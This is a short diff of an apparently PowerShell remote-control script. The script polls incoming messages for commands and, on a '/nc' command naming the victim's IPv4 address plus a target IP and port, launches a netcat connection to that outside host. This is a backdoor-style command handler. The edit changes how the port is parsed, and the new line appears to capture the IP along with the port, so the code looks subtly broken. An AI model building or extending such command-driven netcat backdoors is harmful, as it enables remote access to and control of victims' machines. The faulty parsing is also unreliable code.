@@ -734,7 +734,7 @@ While ($DoNotExit)  {
       }
       "/nc $ipV4 *"{
         $ip = ($LastMessageText -split ("/nc $ipV4 "))[1]
-	$port = ($LastMessageText -split ("/nc $ipV4 "))[2]
+	$port = $LastMessageText -replace "/nc $ipV4 ",""
         netcat $ip $port
       }
       "/stopnc $ipV4"{
